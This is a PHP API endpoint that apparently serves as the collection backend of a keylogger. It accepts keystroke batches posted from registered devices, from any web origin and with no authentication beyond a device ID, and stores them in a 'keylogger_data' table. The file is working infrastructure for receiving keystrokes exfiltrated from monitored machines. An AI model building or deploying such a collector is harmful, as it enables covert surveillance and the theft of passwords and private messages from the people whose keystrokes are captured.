<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit(0);
}

require_once '../config/database.php';
require_once '../includes/functions.php';

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
    exit;
}

$input = json_decode(file_get_contents('php://input'), true);

if (!$input || !isset($input['deviceId']) || !isset($input['keystrokes'])) {
    http_response_code(400);
    echo json_encode(['error' => 'Invalid input data']);
    exit;
}

$deviceId = $input['deviceId'];
$keystrokes = $input['keystrokes'];

try {
    $pdo = getDbConnection();
    
    // Get device database ID
    $stmt = $pdo->prepare("SELECT id FROM devices WHERE device_id = ?");
    $stmt->execute([$deviceId]);
    $device = $stmt->fetch();
    
    if (!$device) {
        http_response_code(404);
        echo json_encode(['error' => 'Device not found']);
        exit;
    }
    
    $deviceDbId = $device['id'];
    
    // Insert keystrokes batch
    $stmt = $pdo->prepare("
        INSERT INTO keylogger_data (device_id, keystroke_data, captured_at, created_at) 
        VALUES (?, ?, NOW(), NOW())
    ");
    
    $keystrokeData = json_encode($keystrokes);
    $stmt->execute([$deviceDbId, $keystrokeData]);
    
    $keystrokeId = $pdo->lastInsertId();
    
    // Log the keylogger event
    logSecurityEvent($deviceDbId, 'keystrokes_logged', [
        'keystroke_id' => $keystrokeId,
        'keystroke_count' => count($keystrokes)
    ]);
    
    echo json_encode([
        'success' => true,
        'message' => 'Keystrokes logged successfully',
        'keystroke_id' => $keystrokeId
    ]);
    
} catch (Exception $e) {
    error_log('Keystroke logging error: ' . $e->getMessage());
    http_response_code(500);
    echo json_encode(['error' => 'Internal server error']);
}
?>
